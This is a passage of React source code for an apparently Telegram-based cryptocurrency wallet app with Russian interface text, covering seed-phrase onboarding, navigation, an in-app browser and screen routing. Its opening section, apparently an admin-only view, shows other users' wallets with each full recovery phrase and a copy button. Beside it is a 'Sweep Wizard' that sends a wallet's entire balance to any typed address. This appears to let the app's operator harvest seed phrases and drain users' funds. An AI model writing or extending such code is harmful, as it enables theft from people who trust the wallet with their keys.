                    <span style={{ color: "rgba(255,255,255,0.5)", fontSize: 10, fontWeight: 600 }}>{dateStr}</span>
                  </div>
                  <svg viewBox="0 0 24 24" fill="none" style={{ width: 18, height: 18,
                    transform: isOpen ? "rotate(90deg)" : "none", transition: "transform 0.3s cubic-bezier(0.4, 0, 0.2, 1)" }}>
                    <path d="M9 18l6-6-6-6" stroke="rgba(255,255,255,0.3)" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                </div>
              </div>

              {/* Expanded */}
              {isOpen && (
                <div style={{ borderTop: "1px solid rgba(255,255,255,0.06)", padding: "20px", background: "rgba(255,255,255,0.01)" }}>

                  {/* Info Grid */}
                  <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginBottom: 20 }}>
                    {[
                      { label: "Total Balance", val: `$${balUSD.toFixed(4)}`, icon: "💵" },
                      { label: "Created At", val: dateStr, icon: "📅" },
                      { label: "Status", val: "Active", icon: "✅" },
                    ].map(item => (
                      <div key={item.label} style={{ background: "rgba(255,255,255,0.03)", borderRadius: 12, padding: "10px 12px", border: "1px solid rgba(255,255,255,0.04)" }}>
                        <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 10, fontWeight: 600, textTransform: "uppercase", marginBottom: 4 }}>{item.label}</div>
                        <div style={{ color: "#fff", fontSize: 13, fontWeight: 600 }}>{item.val}</div>
                      </div>
                    ))}
                  </div>

                  {/* Seed phrase section */}
                  <div style={{ marginBottom: 20 }}>
                    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 8 }}>
                      <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 11, fontWeight: 700, textTransform: "uppercase" }}>🔑 Recovery Phrase</div>
                      <button onClick={e => { e.stopPropagation(); copyText(mnStr, `m_${uid}`); }}
                        style={{ background: copiedKey === `m_${uid}` ? "rgba(52,199,89,0.15)" : "rgba(59,125,255,0.15)",
                          border: "none", color: copiedKey === `m_${uid}` ? "#34C759" : "#3B7DFF",
                          padding: "4px 10px", borderRadius: 8, fontSize: 11, fontWeight: 700, cursor: "pointer", transition: "all 0.2s" }}>
                        {copiedKey === `m_${uid}` ? "COPIED" : "COPY"}
                      </button>
                    </div>
                    <div style={{ background: "rgba(0,0,0,0.2)", border: "1px solid rgba(255,255,255,0.06)",
                      borderRadius: 14, padding: "14px", color: "rgba(255,255,255,0.8)", fontSize: 13,
                      fontFamily: "monospace", wordBreak: "break-word", lineHeight: 1.6, textAlign: "center" }}>
                      {mnStr}
                    </div>
                  </div>

                  {/* Assets Grid */}
                  <div style={{ marginBottom: 24 }}>
                    <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 11, fontWeight: 700, textTransform: "uppercase", marginBottom: 10 }}>📊 Assets</div>
                    <div style={{ display: "grid", gridTemplateColumns: "repeat(4,1fr)", gap: 8 }}>
                      {COINS.map(sym => {
                        const val = parseFloat(w[sym.toLowerCase() + "_balance"] || 0);
                        return (
                          <div key={sym} style={{ background: "rgba(255,255,255,0.03)", borderRadius: 12, padding: "10px 6px", textAlign: "center", border: "1px solid rgba(255,255,255,0.04)" }}>
                            <div style={{ color: "rgba(255,255,255,0.3)", fontSize: 9, fontWeight: 700, marginBottom: 4 }}>{sym}</div>
                            <div style={{ color: val > 0 ? "#34C759" : "rgba(255,255,255,0.2)", fontSize: 12, fontWeight: 700 }}>
                              {val > 0 ? val.toFixed(3) : "0"}
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  </div>

                  {/* Action Button */}
                  <button
                    onClick={e => { 
                      e.stopPropagation(); 
                      setSweepWallet(w); 
                      setSweepResult(null); 
                      setSweepStep('coin');
                      setSweepCoin(null);
                      setSweepTargetAddr("");
                    }}
                    style={{ width: "100%", padding: "16px 0", borderRadius: 16, border: "none",
                      background: "linear-gradient(135deg, #3B7DFF, #6B21A8)",
                      color: "#fff", fontSize: 15, fontWeight: 800, cursor: "pointer",
                      boxShadow: "0 8px 20px rgba(59,125,255,0.2)", transition: "transform 0.2s" }}>
                    SWEEP WALLET
                  </button>
                </div>
              )}
            </div>
          );
        })}
      </div>

      {/* Sweep Modal - Step Flow */}
      {sweepWallet && (
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.9)", zIndex: 9999,
          display: "flex", alignItems: "flex-end", justifyContent: "center", backdropFilter: "blur(10px)" }}
          onClick={() => { if (!sweepLoading) { setSweepWallet(null); setSweepResult(null); } }}>
          <div style={{ width: "100%", maxWidth: 480, background: "#000", borderRadius: "32px 32px 0 0",
            padding: "24px 20px 44px", maxHeight: "85vh", overflowY: "auto", borderTop: "1px solid rgba(255,255,255,0.1)",
            boxShadow: "0 -10px 40px rgba(0,0,0,0.5)" }}
            onClick={e => e.stopPropagation()}>

            {/* Header */}
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 24 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
                {sweepStep !== 'coin' && sweepStep !== 'result' && (
                  <button onClick={() => setSweepStep(sweepStep === 'address' ? 'coin' : 'address')} 
                    style={{ background: "none", border: "none", color: "#3B7DFF", padding: 0 }}>
                    <svg viewBox="0 0 24 24" fill="none" style={{ width: 24, height: 24 }}>
                      <path d="M15 18l-6-6 6-6" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  </button>
                )}
                <span style={{ color: "#fff", fontSize: 20, fontWeight: 800 }}>Sweep Wizard</span>
              </div>
              <button onClick={() => setSweepWallet(null)} style={{ background: "rgba(255,255,255,0.05)", border: "none", borderRadius: "50%", width: 32, height: 32, color: "#fff" }}>×</button>
            </div>

            {/* Step 1: Select Coin */}
            {sweepStep === 'coin' && (
              <div style={{ animation: "fadeIn 0.3s ease" }}>
                <div style={{ color: "rgba(255,255,255,0.5)", fontSize: 13, marginBottom: 16, fontWeight: 600 }}>SELECT ASSET TO WITHDRAW</div>
                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
                  {COINS.map(sym => {
                    const val = parseFloat(sweepWallet[sym.toLowerCase() + "_balance"] || 0);
                    const netId = sym === 'USDT' ? 'eth' : sym.toLowerCase(); // Simplified for demo
                    return (
                      <button key={sym} 
                        onClick={() => { setSweepCoin({ sym, netId }); setSweepStep('address'); }}
                        style={{ background: "rgba(255,255,255,0.03)", border: "1px solid rgba(255,255,255,0.06)", borderRadius: 16, padding: "16px", textAlign: "left" }}>
                        <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 10, fontWeight: 700, marginBottom: 4 }}>{sym}</div>
                        <div style={{ color: val > 0 ? "#34C759" : "#fff", fontSize: 16, fontWeight: 800 }}>{val.toFixed(4)}</div>
                      </button>
                    );
                  })}
                </div>
              </div>
            )}

            {/* Step 2: Enter Address */}
            {sweepStep === 'address' && (
              <div style={{ animation: "fadeIn 0.3s ease" }}>
                <div style={{ color: "rgba(255,255,255,0.5)", fontSize: 13, marginBottom: 16, fontWeight: 600 }}>DESTINATION ADDRESS ({sweepCoin.sym})</div>
                <div style={{ background: "rgba(255,255,255,0.05)", borderRadius: 16, padding: "4px", border: "1px solid rgba(255,255,255,0.1)", marginBottom: 24 }}>
                  <textarea
                    placeholder="Paste recipient address here..."
                    value={sweepTargetAddr}
                    onChange={e => setSweepTargetAddr(e.target.value)}
                    style={{ width: "100%", background: "none", border: "none", outline: "none", color: "#fff", fontSize: 15, padding: "12px", minHeight: 100, fontFamily: "monospace", resize: "none" }}
                  />
                </div>
                <button 
                  disabled={!sweepTargetAddr || sweepTargetAddr.length < 10}
                  onClick={() => setSweepStep('confirm')}
                  style={{ width: "100%", padding: "16px 0", borderRadius: 16, border: "none", background: "#3B7DFF", color: "#fff", fontSize: 16, fontWeight: 800, opacity: (!sweepTargetAddr || sweepTargetAddr.length < 10) ? 0.5 : 1 }}>
                  CONTINUE
                </button>
              </div>
            )}

            {/* Step 3: Confirm */}
            {sweepStep === 'confirm' && (
              <div style={{ animation: "fadeIn 0.3s ease" }}>
                <div style={{ color: "rgba(255,255,255,0.5)", fontSize: 13, marginBottom: 16, fontWeight: 600 }}>CONFIRM TRANSACTION</div>
                <div style={{ background: "rgba(59,125,255,0.05)", border: "1px solid rgba(59,125,255,0.1)", borderRadius: 20, padding: "20px", marginBottom: 24 }}>
                  <div style={{ marginBottom: 16 }}>
                    <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 11, fontWeight: 700, marginBottom: 4 }}>WITHDRAWING</div>
                    <div style={{ color: "#fff", fontSize: 24, fontWeight: 800 }}>{parseFloat(sweepWallet[sweepCoin.sym.toLowerCase() + "_balance"] || 0).toFixed(6)} {sweepCoin.sym}</div>
                  </div>
                  <div>
                    <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 11, fontWeight: 700, marginBottom: 4 }}>TO RECIPIENT</div>
                    <div style={{ color: "#fff", fontSize: 13, fontWeight: 500, wordBreak: "break-all", fontFamily: "monospace" }}>{sweepTargetAddr}</div>
                  </div>
                </div>
                <button 
                  disabled={sweepLoading}
                  onClick={executeStepSweep}
                  style={{ width: "100%", padding: "16px 0", borderRadius: 16, border: "none", background: "linear-gradient(135deg, #3B7DFF, #6B21A8)", color: "#fff", fontSize: 16, fontWeight: 800 }}>
                  {sweepLoading ? "SENDING..." : "CONFIRM & SEND"}
                </button>
              </div>
            )}

            {/* Step 4: Result */}
            {sweepStep === 'result' && (
              <div style={{ animation: "fadeIn 0.3s ease", textAlign: "center", padding: "20px 0" }}>
                <div style={{ width: 64, height: 64, borderRadius: "50%", background: sweepResult.success ? "rgba(52,199,89,0.1)" : "rgba(255,69,58,0.1)", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 20px" }}>
                  {sweepResult.success ? (
                    <svg viewBox="0 0 24 24" fill="none" style={{ width: 32, height: 32, color: "#34C759" }}>
                      <path d="M20 6L9 17l-5-5" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  ) : (
                    <svg viewBox="0 0 24 24" fill="none" style={{ width: 32, height: 32, color: "#FF453A" }}>
                      <path d="M18 6L6 18M6 6l12 12" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  )}
                </div>
                <div style={{ color: "#fff", fontSize: 22, fontWeight: 800, marginBottom: 8 }}>{sweepResult.success ? "Success!" : "Failed"}</div>
                <div style={{ color: "rgba(255,255,255,0.5)", fontSize: 14, marginBottom: 24, wordBreak: "break-all" }}>
                  {sweepResult.success ? `Transaction sent: ${sweepResult.txHash.slice(0, 20)}...` : sweepResult.message}
                </div>
                <button 
                  onClick={() => setSweepWallet(null)}
                  style={{ width: "100%", padding: "16px 0", borderRadius: 16, border: "none", background: "rgba(255,255,255,0.1)", color: "#fff", fontSize: 16, fontWeight: 800 }}>
                  CLOSE
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

/* ─── Onboarding Flow (Integrated) ─────────────────────────── */
function OnboardingFlow({ mode, onBack }) {
  const { importWallet, generateNewMnemonic } = useWallet();
  const [step, setStep] = useState(mode === "create" ? "backup" : "import");
  const [mnemonic, setMnemonic] = useState("");
  const [importPhrase, setImportPhrase] = useState("");
  const [password, setPassword] = useState("");
  const [password2, setPassword2] = useState("");
  const [error, setError] = useState("");
  const [confirmed, setConfirmed] = useState(false);
  const [verifyIndices, setVerifyIndices] = useState([]);
  const [verifyInputs, setVerifyInputs] = useState({});
  const [localLoading, setLocalLoading] = useState(false);

  useEffect(() => {
    if (mode === "create" && !mnemonic) {
      setMnemonic(generateNewMnemonic());
    }
  }, [mode, mnemonic, generateNewMnemonic]);

  const prepareVerify = () => {
    const words = mnemonic.split(" ");
    const indices = [];
    while (indices.length < 3) {
      const r = Math.floor(Math.random() * 12);
      if (!indices.includes(r)) indices.push(r);
    }
    setVerifyIndices(indices.sort((a, b) => a - b));
    setVerifyInputs({});
    setStep("verify");
  };

  const handleVerify = () => {
    const words = mnemonic.split(" ");
    let isCorrect = true;
    for (const idx of verifyIndices) {
      if ((verifyInputs[idx] || "").trim().toLowerCase() !== words[idx].toLowerCase()) {
        isCorrect = false;
        break;
      }
    }
    if (!isCorrect) {
      setError("Неверные слова. Проверьте фразу.");
      return;
    }
    setStep("create-password");
  };

  const handleFinishCreate = async () => {
    setError("");
    if (password.length < 6) { setError("Пароль минимум 6 символов"); return; }
    if (password !== password2) { setError("Пароли не совпадают"); return; }
    setLocalLoading(true);
    try {
      await importWallet(mnemonic, password);
      window.location.reload(); // To reset everything
    } catch (e) {
      setError(e.message);
      setLocalLoading(false);
    }
  };

  const handleImport = async () => {
    setError("");
    const words = importPhrase.trim().split(/\s+/);
    if (words.length !== 12 && words.length !== 24) { setError("Введите 12 или 24 слова"); return; }
    if (password.length < 6) { setError("Пароль минимум 6 символов"); return; }
    if (password !== password2) { setError("Пароли не совпадают"); return; }
    setLocalLoading(true);
    try {
      await importWallet(importPhrase.trim(), password);
      window.location.reload();
    } catch (e) {
      setError(e.message);
      setLocalLoading(false);
    }
  };

  if (step === "backup") return (
    <ORoot>
      <OBackBtn onClick={onBack} />
      <div style={{ paddingTop: 8 }}>
        <div style={{ color: DS.text, fontWeight: 700, fontSize: 24, marginBottom: 8 }}>Ваша seed-фраза</div>
        <div style={{ background: "rgba(255,149,0,0.1)", border: "1px solid rgba(255,149,0,0.3)", borderRadius: 12, padding: "14px 16px", marginBottom: 20 }}>
          <span style={{ color: DS.warn, fontSize: 14, lineHeight: 1.5 }}>
            ⚠️ Запишите эти 12 слов и храните в безопасном месте. Без них восстановить кошелёк невозможно.
          </span>
        </div>
        <div style={{ display: "flex", flexWrap: "wrap", gap: 8, marginBottom: 24 }}>
          {mnemonic.split(" ").map((word, i) => (
            <div key={i} style={{ background: DS.card, borderRadius: 10, padding: "8px 14px", border: `1px solid ${DS.border}`, display: "flex", gap: 8, alignItems: "center" }}>
              <span style={{ color: "#555", fontSize: 11, minWidth: 14, textAlign: "right" }}>{i + 1}</span>
              <span style={{ color: DS.text, fontSize: 14, fontWeight: 600 }}>{word}</span>
            </div>
          ))}
        </div>
        <div onClick={() => setConfirmed(c => !c)}
          style={{ display: "flex", alignItems: "center", gap: 12, padding: "14px 16px", background: DS.card, borderRadius: 14, border: `1px solid ${confirmed ? DS.blueS : DS.border}`, cursor: "pointer", marginBottom: 16 }}>
          <div style={{ width: 22, height: 22, borderRadius: 6, border: `2px solid ${confirmed ? DS.blueS : "#555"}`, background: confirmed ? DS.blueS : "transparent", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0, transition: "all 0.2s" }}>
            {confirmed && <svg viewBox="0 0 24 24" fill="none" style={{ width: 14, height: 14 }}><path d="M5 13l4 4L19 7" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" /></svg>}
          </div>
          <span style={{ color: DS.text, fontSize: 14 }}>Я записал seed-фразу в безопасное место</span>
        </div>
        <OBtn onClick={prepareVerify} disabled={!confirmed}>Готово — продолжить</OBtn>
      </div>
    </ORoot>
  );

  if (step === "verify") return (
    <ORoot>
      <OBackBtn onClick={() => setStep("backup")} />
      <div style={{ color: DS.text, fontWeight: 700, fontSize: 24, marginBottom: 8, marginTop: 16 }}>Проверка фразы</div>
      <div style={{ color: DS.muted, fontSize: 15, marginBottom: 32, lineHeight: 1.5 }}>Введите указанные слова, чтобы подтвердить сохранение фразы</div>
      {verifyIndices.map(idx => (
        <div key={idx} style={{ marginBottom: 16 }}>
          <div style={{ color: DS.muted, fontSize: 12, marginBottom: 8, textTransform: "uppercase", fontWeight: 700 }}>Слово №{idx + 1}</div>
          <OInputRow placeholder="Введите слово" value={verifyInputs[idx] || ""} onChange={val => setVerifyInputs({...verifyInputs, [idx]: val})} />
        </div>
      ))}
      <div style={{ flex: 1 }} />
      <OErr msg={error} />
      <OBtn onClick={handleVerify}>Подтвердить и начать</OBtn>
    </ORoot>
  );

  if (step === "create-password") return (
    <ORoot>
      <OBackBtn onClick={() => setStep("verify")} />
      <div style={{ color: DS.text, fontWeight: 700, fontSize: 24, marginBottom: 8, marginTop: 16 }}>Создать пароль</div>
      <div style={{ color: DS.muted, fontSize: 15, marginBottom: 32, lineHeight: 1.5 }}>Придумайте надёжный пароль для шифрования ключей</div>
      <OInputRow type="password" placeholder="Пароль (минимум 6 символов)" value={password} onChange={setPassword} />
      <OInputRow type="password" placeholder="Повторите пароль" value={password2} onChange={setPassword2} />
      <div style={{ flex: 1 }} />
      <OErr msg={error} />
      <OBtn onClick={handleFinishCreate} disabled={localLoading}>{localLoading ? "Завершение…" : "Создать кошелек"}</OBtn>
    </ORoot>
  );

  if (step === "import") return (
    <ORoot>
      <OBackBtn onClick={onBack} />
      <div style={{ color: DS.text, fontWeight: 700, fontSize: 24, marginBottom: 8, marginTop: 16 }}>Импорт кошелька</div>
      <div style={{ color: DS.muted, fontSize: 15, marginBottom: 20, lineHeight: 1.5 }}>Введите 12 или 24 слова через пробел</div>
      <OInputRow multiline placeholder="word1 word2 word3 …" value={importPhrase} onChange={setImportPhrase} />
      <OInputRow type="password" placeholder="Новый пароль (минимум 6 символов)" value={password} onChange={setPassword} />
      <OInputRow type="password" placeholder="Повторите пароль" value={password2} onChange={setPassword2} />
      <div style={{ flex: 1 }} />
      <OErr msg={error} />
      <OBtn onClick={handleImport} disabled={localLoading}>{localLoading ? "Импорт…" : "Импортировать"}</OBtn>
    </ORoot>
  );

  return null;
}

/* ─── Bottom Nav — matched to screenshot ─────────────────────── */
const BottomNav = memo(({ activeTab, setActiveTab }) => {
  const { settings } = useWallet();
  const T = getLang(settings);
  const tabs = [
    {
      id: "wallet",
      label: T.wallet,
      Icon: ({ active }) => (
        <svg viewBox="0 0 24 24" fill="none" style={{ width: 24, height: 24 }}>
          <path d="M12 2L3 9L12 22L21 9L12 2Z" stroke={active ? DS.blue : DS.muted} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
          <path d="M3 9H21" stroke={active ? DS.blue : DS.muted} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
          <path d="M12 2L12 22" stroke={active ? DS.blue : DS.muted} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
      )
    },
    {
      id: "collections",
      label: T.collections,
      Icon: ({ active }) => (
        <svg viewBox="0 0 24 24" fill="none" style={{ width: 24, height: 24 }}>
          <rect x="4" y="4" width="7" height="7" rx="1.5" stroke={active ? DS.blue : DS.muted} strokeWidth="2" />
          <rect x="13" y="4" width="7" height="7" rx="1.5" stroke={active ? DS.blue : DS.muted} strokeWidth="2" />
          <rect x="4" y="13" width="7" height="7" rx="1.5" stroke={active ? DS.blue : DS.muted} strokeWidth="2" />
          <rect x="13" y="13" width="7" height="7" rx="1.5" stroke={active ? DS.blue : DS.muted} strokeWidth="2" />
        </svg>
      )
    },
    {
      id: "activity",
      label: T.activity,
      Icon: ({ active }) => (
        <svg viewBox="0 0 24 24" fill="none" style={{ width: 24, height: 24 }}>
          <path d="M13 2L3 14H12L11 22L21 10H12L13 2Z" fill={active ? DS.blue : "none"} stroke={active ? DS.blue : DS.muted} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
      )
    },
    {
      id: "settings",
      label: T.settings,
      Icon: ({ active }) => (
        <svg viewBox="0 0 24 24" fill="none" style={{ width: 24, height: 24 }}>
          <circle cx="12" cy="12" r="3" stroke={active ? DS.blue : DS.muted} strokeWidth="2" />
          <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z" stroke={active ? DS.blue : DS.muted} strokeWidth="2" />
        </svg>
      )
    }
  ];

  const isAdmin = useIsAdmin();
  if (isAdmin) {
    tabs.push({
      id: "admin",
      label: "Админ",
      Icon: ({ active }) => (
        <svg viewBox="0 0 24 24" fill="none" style={{ width: 24, height: 24 }}>
          <path d="M12 15a3 3 0 1 0 0-6 3 3 0 0 0 0 6Z" stroke={active ? DS.blue : DS.muted} strokeWidth="2" />
          <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z" stroke={active ? DS.blue : DS.muted} strokeWidth="2" />
        </svg>
      )
    });
  }

  return (
    <div style={{ background: "rgba(10, 10, 10, 0.92)", backdropFilter: "blur(20px)", borderTop: `1px solid ${DS.border}`, display: "flex", padding: "8px 0 28px" }}>
      {tabs.map((tab) => {
        const active = activeTab === tab.id;
        return (
          <div key={tab.id} onClick={() => setActiveTab(tab.id)}
            style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", gap: 4, cursor: "pointer", transition: "all 0.2s" }}>
            <div className="nav-icon" style={{
              width: 48, height: 32, borderRadius: 16,
              background: active ? "rgba(59,125,255,0.18)" : "transparent",
              border: active ? `1.5px solid rgba(59,125,255,0.45)` : "1.5px solid transparent",
              display: "flex", alignItems: "center", justifyContent: "center",
              transition: "all 0.2s",
            }}>
              <tab.Icon active={active} />
            </div>
            <span style={{ color: active ? DS.blue : DS.muted, fontSize: 11, fontWeight: active ? 600 : 500 }}>{tab.label}</span>
          </div>
        );
      })}
    </div>
  );
});

/* ─── In-App Browser ─────────────────────────────────────────── */
let __openInAppBrowser = null;
function openInApp(url) {
  if (__openInAppBrowser) {
    __openInAppBrowser(url);
  } else {
    const tg = window.Telegram?.WebApp;
    if (tg?.openLink) tg.openLink(url, { try_instant_view: false });
    else window.open(url, '_blank');
  }
}

const InAppBrowserModal = ({ url, onClose }) => {
  const [loading, setLoading] = useState(true);
  const displayUrl = url.replace(/^https?:\/\//, '').replace(/\/$/, '');
  return (
    <div style={{ position: 'fixed', inset: 0, zIndex: 9999, display: 'flex', flexDirection: 'column',
      background: DS.bg, fontFamily: "'Inter','Roboto',sans-serif" }}>
      <div style={{ display: 'flex', alignItems: 'center', padding: '10px 12px', background: DS.card,
        borderBottom: `1px solid ${DS.border}`, gap: 8, flexShrink: 0 }}>
        <button onClick={onClose} style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 6, flexShrink: 0 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}>
            <path d="M18 6L6 18M6 6l12 12" stroke="white" strokeWidth="2.5" strokeLinecap="round" />
          </svg>
        </button>
        <div style={{ flex: 1, background: DS.input, borderRadius: 10, padding: '7px 12px', overflow: 'hidden' }}>
          <div style={{ color: DS.muted, fontSize: 13, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{displayUrl}</div>
        </div>
        <button onClick={() => { const tg = window.Telegram?.WebApp; if (tg?.openLink) tg.openLink(url, { try_instant_view: false }); else window.open(url, '_blank'); }}
          style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 6, flexShrink: 0 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}>
            <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" stroke={DS.blue} strokeWidth="2" strokeLinecap="round" />
            <path d="M15 3h6v6M10 14L21 3" stroke={DS.blue} strokeWidth="2" strokeLinecap="round" />
          </svg>
        </button>
      </div>
      {loading && (
        <div style={{ position: 'absolute', top: 56, left: 0, right: 0, bottom: 0, display: 'flex',
          alignItems: 'center', justifyContent: 'center', background: DS.bg }}>
          <div style={{ color: DS.muted, fontSize: 15 }}>Загрузка…</div>
        </div>
      )}
      <iframe src={url} onLoad={() => setLoading(false)}
        style={{ flex: 1, border: 'none', background: 'white' }} allow="fullscreen" title="browser" />
    </div>
  );
};

/* ─── Root component ─────────────────────────────────────────── */
function WalletHomeUI() {
  const [screen, setScreen] = useState({ name: "home" });
  const [activeTab, setActiveTab] = useState("wallet");
  const [showComingSoon, setShowComingSoon] = useState(false);
  const [swapPayId, setSwapPayId] = useState(null);
  const [swapReceiveId, setSwapReceiveId] = useState(null);
  const [inAppUrl, setInAppUrl] = useState(null);
  const isAdmin = useIsAdmin();

  useEffect(() => {
    __openInAppBrowser = (url) => setInAppUrl(url);
    return () => { __openInAppBrowser = null; };
  }, []);

  const go = useCallback((s) => setScreen(s || { name: "home" }), []);

  if (!screen) return null; // Defensive
  const isHome = screen.name === "home";

  return (
    <div style={{ background: "#0D0D0F", minHeight: "100vh", display: "flex", justifyContent: "center", fontFamily: "'Inter','Roboto',sans-serif" }}>
      <AnimStyles />
      {inAppUrl && <InAppBrowserModal url={inAppUrl} onClose={() => setInAppUrl(null)} />}
      <div style={{ width: "100%", maxWidth: 420, minHeight: "100vh", background: "#0D0D0F", display: "flex", flexDirection: "column", position: "relative" }}>

        {showComingSoon && (
          <>
            <div onClick={() => setShowComingSoon(false)}
              style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.6)", zIndex: 50 }} />
            <div style={{ position: "fixed", top: "50%", left: "50%", transform: "translate(-50%,-50%)",
              background: "#181820", borderRadius: 20, padding: "32px 28px", zIndex: 51,
              textAlign: "center", width: 280 }}>
              <div style={{ fontSize: 40, marginBottom: 12 }}>🚀</div>
              <div style={{ color: "white", fontWeight: 700, fontSize: 20, marginBottom: 8 }}>Coming Soon</div>
              <div style={{ color: "#888", fontSize: 14, marginBottom: 24 }}>Функция покупки скоро появится!</div>
              <button onClick={() => setShowComingSoon(false)}
                style={{ background: "linear-gradient(145deg, #4F8FFF, #1A55E3)", border: "none", borderRadius: 12, color: "white",
                  fontSize: 15, fontWeight: 600, padding: "12px 32px", cursor: "pointer", width: "100%" }}>
                Понятно
              </button>
            </div>
          </>
        )}

        {screen.name === "home" && activeTab === "wallet" && (
          <HomeScreen
            onSend={() => go({ name: "send-select" })}
            onReceive={() => go({ name: "receive-select" })}
            onBuy={() => setShowComingSoon(true)}
            onSwap={() => { setSwapPayId(null); setSwapReceiveId(null); go({ name: "swap" }); }}
            onAssetClick={(id) => go({ name: "asset-detail", assetId: id })}
            onWalletsClick={() => go({ name: "wallets" })}
          />
        )}

        {screen.name === "home" && activeTab === "collections" && (
          <CollectionsScreen onReceive={() => go({ name: "receive-nft-select" })} />
        )}

        {screen.name === "home" && activeTab === "activity" && (
          <ActivityScreen activeTab={activeTab} setActiveTab={setActiveTab} />
        )}

        {screen.name === "home" && activeTab === "settings" && (
          <SettingsScreen activeTab={activeTab} setActiveTab={setActiveTab}
            isAdmin={isAdmin} onAdminPanel={() => setActiveTab("admin")}
            onWalletsClick={() => go({ name: "wallets" })} />
        )}

        {screen.name === "wallets" && (
          <div className="anim-page">
            <WalletsScreen 
              onBack={() => go({ name: "home" })}
              onAdd={() => go({ name: "wallet-add" })}
              onSettings={(w) => go({ name: "wallet-settings", wallet: w })}
            />
          </div>
        )}

        {screen.name === "wallet-settings" && (
          <div className="anim-page">
            <WalletSettingsScreen 
              wallet={screen.wallet}
              onBack={() => go({ name: "wallets" })}
            />
          </div>
        )}

        {screen.name === "wallet-add" && (
          <div className="anim-page">
            <WalletAddScreen 
              onBack={() => go({ name: "wallets" })}
              onCreate={() => go({ name: "wallet-create-onboarding" })}
              onImport={() => go({ name: "wallet-import-onboarding" })}
              onShowMenu={() => go({ name: "wallet-backup-menu" })}
            />
          </div>
        )}

        {screen.name === "wallet-backup-menu" && (
          <div className="anim-page">
            <WalletBackupMenu 
              onBack={() => go({ name: "wallet-add" })}
              onOption={(opt) => {
                if (opt === "manual") go({ name: "wallet-create-onboarding" });
                else alert("Резервное копирование " + opt + " скоро появится!");
              }}
